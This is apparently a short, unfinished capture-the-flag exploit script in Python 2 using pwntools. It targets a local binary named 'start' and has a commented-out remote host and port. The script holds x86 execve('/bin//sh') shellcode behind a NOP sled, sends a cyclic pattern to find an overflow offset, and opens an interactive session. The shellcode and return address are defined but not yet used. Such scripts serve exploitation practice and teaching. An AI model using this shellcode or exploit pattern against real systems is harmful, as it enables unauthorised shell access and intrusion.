#!/bin/env python2
from pwn import *

p = process('./start')
#p = remote('139.59.114.220', 10001)
addr = p32(0x0)
shell = '\x90'*10+'\x90\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'


p.send(cyclic(50))
p.interactive()
